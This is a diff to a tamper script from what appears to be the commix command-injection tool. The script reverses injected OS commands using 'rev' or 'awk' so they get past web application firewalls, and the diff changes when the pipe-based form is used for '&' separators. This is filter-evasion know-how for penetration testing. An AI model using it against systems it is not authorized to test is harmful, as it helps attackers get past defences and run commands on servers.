@@ -18,11 +18,13 @@ from src.core.controller import checks
 
 """
 About: Reverses (characterwise) the user-supplied operating system commands in a given payload.
-Notes: This tamper script works against target(s) with a POSIX shell. The command is read back
-       from its end by 'rev' where the separator under test is a pipe, and by 'awk' - which takes
-       the words as arguments instead - where it is a ';' or a newline, those being what awk puts
-       between its own statements. On any other separator neither form can be written without
-       smuggling an operator the payload is not proving, and the script is left out of it.
+Notes: This tamper script works against target(s) with a POSIX shell. Reading a command back
+       from its end needs an operator either way, so the form handed over is the one whose
+       operator the payload is already proving: 'awk' - which takes the words as arguments - where
+       the separator under test is a ';' or a newline, those being what awk puts between its own
+       statements, and 'rev' reading from a pipe where it is anything else. A filter strips one of
+       ';', '&' and '|' together with the others, so a target that let a '&' separator through is
+       not the one that stops the pipe.
 References: [1] https://github.com/commixproject/commix/issues/408
             [2] https://medium.com/picus-security/how-to-bypass-wafs-for-os-command-injection-2c5dd4e6a52b
 """
@@ -51,16 +53,16 @@ def tamper(payload):
     if settings.USER_APPLIED_CMD in source:
       # 'rev' reads its input through a pipe and awk reads its own program through a ';' or a
       # newline, so the form handed over is the one whose operator is the separator under test.
+      # Reading a command back from its end needs an operator either way: awk puts a ';' or a
+      # newline between its own statements, 'rev' reads from a pipe. Where one of them is the
+      # separator under test, that is the form handed over. Where neither is - a '&' or '&&'
+      # separator - the pipe goes anyway: a filter that strips one of ';', '&' and '|' strips the
+      # others with it, so a target that let '&' through is not the one that stops a pipe.
       separator = checks.current_separator()
-      if separator == settings.PIPE_SEPARATOR:
-        reversed_cmd = "echo" + settings.SINGLE_WHITESPACE + settings.USER_APPLIED_CMD[::-1] + "|rev"
-      elif checks.awk_separator_usable(separator):
+      if checks.awk_separator_usable(separator):
         reversed_cmd = "awk" + settings.SINGLE_WHITESPACE + checks.awk_reverse_program(separator) + settings.SINGLE_WHITESPACE + settings.USER_APPLIED_CMD[::-1]
       else:
-        warn_msg = "Nothing reads a command back from its end without an operator of its own, and "
-        warn_msg += "none of the ones that do is the separator under test. Skipping tamper script."
-        settings.print_once(warn_msg)
-        return payload
+        reversed_cmd = "echo" + settings.SINGLE_WHITESPACE + settings.USER_APPLIED_CMD[::-1] + "|rev"
       if settings.USE_BACKTICKS:
         rev_cmd = "\\`" + reversed_cmd + "\\`"
       else:
